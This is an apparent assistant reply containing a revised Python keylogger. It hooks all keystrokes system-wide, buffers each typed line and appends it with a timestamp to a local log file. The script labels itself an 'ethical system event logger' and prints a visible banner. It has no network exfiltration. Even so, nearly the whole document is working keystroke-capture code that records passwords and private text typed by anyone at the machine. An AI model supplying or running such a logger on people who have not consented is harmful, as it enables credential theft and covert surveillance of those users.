
### Revised Code: Buffering Input for Clear Logging

# Replace your existing `on_key_event` function and introduce the global `logged_line` variable.


import keyboard
import time
import os

LOG_FILE = 'security__event_log.txt'

# GLOBAL VARIABLE: This will temporarily hold all characters typed since the last Enter press.
logged_line = ""

# Define a list of control keys you want to IGNORE (Case-insensitive comparison is safer)
# We handle 'enter', 'backspace', and 'space' separately in the logic.
NON_PRINTABLE_KEYS = [
    'shift', 'tab', 'alt', 'ctrl', 'left', 'right', 'up', 'down', 'esc', 
    'delete', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 
    'f11', 'f12', 'caps lock', 'home', 'end', 'page up', 'page down', 'insert'
]

def on_key_event(event):
    global logged_line # Tell the function to use the global buffer variable

    # --- Only process Key Down events ---
    if event.event_type == keyboard.KEY_DOWN:
        key_name = event.name.lower() # Convert to lowercase for reliable comparison
        
        # 1. Handle ENTER key (WRITE TO FILE)
        if key_name == 'enter':
            if logged_line: # Only write if there is text in the buffer
                # Format the full line with a single timestamp
                final_log_entry = f"[{time.ctime()}] Input: {logged_line}\n"
                
                try:
                    with open(LOG_FILE, 'a') as f:
                        f.write(final_log_entry)
                    print(f"[LOGGED LINE]: {logged_line}")
                    
                except Exception as e:
                    print(f"[ERROR] Could not write to log file: {e}")

                # Reset the line buffer for the next input
                logged_line = ""
            return 

        # 2. Handle BACKSPACE (ERASE)
        elif key_name == 'backspace':
            # Remove the last character from the buffer
            logged_line = logged_line[:-1]
            return

        # 3. Handle SPACEBAR
        elif key_name == 'space':
            logged_line += " "
            return
            
        # 4. Filter other control keys
        elif key_name in NON_PRINTABLE_KEYS or len(key_name) > 1:
            return 
            
        # 5. Collect the VALID printable character
        else:
            logged_line += key_name
            # Optional: print current progress to terminal without a newline
            # print(f"Buffer: {logged_line}", end='\r')


    # --- Exit Hook ---
    if event.name == 'esc':
        # Write any remaining buffered text before exiting
        if logged_line:
            final_log_entry = f"[{time.ctime()}] Input: {logged_line} [EXIT]\n"
            with open(LOG_FILE, 'a') as f:
                f.write(final_log_entry)
        
        print("\n[SYSTEM]: Stopping event logger. Data saved.")
        return False 


# --- Main Logic (You need to ensure this is present at the bottom) ---

print("=" * 45)
print("ETHICAL SYSTEM EVENT LOGGER STARTED (Line Buffered)")
print(f"Log will be saved to: {os.path.abspath(LOG_FILE)}")
print("Type and press ENTER to save the line. Press ESC to stop the logger.")
print("=" * 45)

keyboard.hook(on_key_event)
keyboard.wait('esc')
